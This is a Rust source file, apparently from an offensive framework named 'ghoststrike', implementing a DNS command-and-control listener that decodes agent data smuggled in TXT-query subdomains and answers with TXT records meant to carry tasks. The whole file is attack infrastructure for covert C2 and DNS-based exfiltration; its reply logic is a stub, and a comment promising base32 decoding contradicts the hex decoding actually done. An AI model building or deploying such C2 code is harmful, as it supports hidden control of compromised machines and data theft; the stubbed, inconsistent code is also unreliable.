/// DNS C2 listener.
///
/// Protocol:
///   Agent encodes a base32 blob in a TXT query:  <data>.<domain>
///   Server responds with TXT records carrying base64-encoded task data.
///
/// This is a proof-of-concept implementation using trust-dns-server.
use anyhow::Result;
use std::net::SocketAddr;
use tokio::sync::oneshot;
use tracing::{info, warn};

use trust_dns_server::{
    authority::{Catalog, MessageRequest, MessageResponseBuilder},
    proto::op::{MessageType, OpCode, ResponseCode},
    proto::rr::{rdata::TXT, Name, RData, Record, RecordType},
    server::{Request, RequestHandler, ResponseHandler, ResponseInfo},
    ServerFuture,
};

use crate::state::SharedState;

pub async fn start(
    state: SharedState,
    cfg: ghoststrike_common::ListenerConfig,
    shutdown_rx: oneshot::Receiver<()>,
) -> Result<tokio::task::JoinHandle<()>> {
    let domain = cfg
        .dns_domain
        .clone()
        .unwrap_or_else(|| format!("c2.{}", cfg.host));

    let addr: SocketAddr = format!("{}:{}", cfg.host, cfg.port).parse()?;

    let handler = GhostDnsHandler {
        state,
        domain: domain.clone(),
    };

    let handle = tokio::spawn(async move {
        info!("DNS listener on {addr} for domain {domain}");
        let mut server = ServerFuture::new(handler);
        // Bind UDP — DNS primarily uses UDP.
        match tokio::net::UdpSocket::bind(addr).await {
            Ok(udp) => server.register_socket(udp),
            Err(e) => {
                warn!("DNS UDP bind failed: {e}");
                return;
            }
        }
        tokio::select! {
            _ = server.block_until_done() => {}
            _ = shutdown_rx => { info!("DNS listener shutdown signal received"); }
        }
    });

    Ok(handle)
}

struct GhostDnsHandler {
    state:  SharedState,
    domain: String,
}

#[async_trait::async_trait]
impl RequestHandler for GhostDnsHandler {
    async fn handle_request<R: ResponseHandler>(
        &self,
        request: &Request,
        mut response_handle: R,
    ) -> ResponseInfo {
        let builder = MessageResponseBuilder::from_message_request(request);

        if request.op_code() != OpCode::Query
            || request.message_type() != MessageType::Query
        {
            let resp = builder.error_msg(request.header(), ResponseCode::NotImp);
            return response_handle.send_response(resp).await
                .unwrap_or_else(|_| ResponseInfo::from(*request.header()));
        }

        let query    = request.query();
        let qname    = query.name().to_string();
        let qt       = query.query_type();

        // Only answer TXT queries for our domain.
        if qt != RecordType::TXT || !qname.ends_with(&self.domain) {
            let resp = builder.error_msg(request.header(), ResponseCode::NXDomain);
            return response_handle.send_response(resp).await
                .unwrap_or_else(|_| ResponseInfo::from(*request.header()));
        }

        // Extract agent-encoded data from subdomain label.
        let subdomain = qname.trim_end_matches(&self.domain).trim_end_matches('.');
        let decoded   = decode_dns_data(subdomain);
        tracing::debug!("DNS data from {qname}: {decoded:?}");

        // Build a TXT response — carry pending task data back as base64.
        // For now respond with an empty "ok" record; full protocol TBD per Phase 2.
        let txt_rdata = RData::TXT(TXT::new(vec!["ok".to_string()]));
        let record = Record::from_rdata(
            Name::from_ascii(&qname).unwrap(),
            60,
            txt_rdata,
        );

        let mut header = *request.header();
        header.set_message_type(MessageType::Response);
        header.set_response_code(ResponseCode::NoError);

        let resp = builder.build(header, vec![&record], vec![], vec![], vec![]);
        response_handle.send_response(resp).await
            .unwrap_or_else(|_| ResponseInfo::from(*request.header()))
    }
}

/// Base32-decode the subdomain labels into bytes.
fn decode_dns_data(subdomain: &str) -> Vec<u8> {
    // Strip dots between labels and decode the concatenated base32.
    let raw: String = subdomain.chars().filter(|c| *c != '.').collect();
    // Simple fallback: treat as hex.
    hex::decode(&raw).unwrap_or_default()
}
